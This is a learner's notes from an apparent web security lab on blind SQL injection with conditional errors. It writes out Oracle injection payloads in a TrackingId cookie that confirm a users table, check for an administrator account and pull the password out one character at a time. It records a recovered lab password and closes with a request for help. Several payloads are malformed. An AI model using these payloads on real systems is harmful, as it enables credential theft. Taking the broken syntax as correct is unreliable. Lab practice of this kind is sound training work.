@@ -1,0 +1,43 @@
+lab 12 :Blind SQL injection with conditional errors
+
+#testing the parameter if he is vulnirable (traking id)
+
+#to do this we should do a query around this parameeter(the tracking id) if the parameter is vulnirable when we call
+#something from a table in the database no eurror will return that means the parameter is vulnirable the opposit if we test in false table on the database will return eurror
+
+TrackingId=xyz'||(SELECT '' FROM dual)||' #no eurror returned
+TrackingId=xyz'||(SELECT '' FROM dualfdezd)||' #an eurror returned because the there is no table in the database called dualfdezd
+
+#NOW WE TEST IF THE users table exist 
+#if the users table exit when selecting something on it it will not return an eurrer
+#rownum=1 because if users tables contain + than one rows we will break the concatenation
+
+TrackingId=xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||' 
+
+#NOW WE TEST IF THE username  exist 
+#if the username administrator exist then the query will be executed i mean :||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END if the username administrator doesn't exist the query will not be executed
+#if will not executed we mean no query will be exuted then 200k response
+
+TrackingId=xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
+
+#now we should find the password
+#first we find the lenght 
+#same thing as the query before
+
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') and lenght(password>50))||'
+#we send it to intuder and we see when the query statut is 200 i mean true that means we started in a new step when the password lenght is not equal to those value after ythe first 200k status
+
+the lenght of the password is 20.
+
+#we find the password 
+'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') and substr(password,1,1)='a') || '
+
+password : m53sqwoskw44epkmeu02
+
+problem : i can't get what you want from this query :'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator') and substr(password,1,1)='a') || '
+
+what the result must output : if the 'a' is the first carractaire of the password it must output eurreur if not output 200k result in burp suite 
+
+what the result i find : eurreur in all query i do while i change the 'a' in the substruct function substr(password,1,1)='a') which is impossible because it must output eurror only if the alphaet id true the fist carractaire of the password
+
+can you help me to find what's the problem is please ?
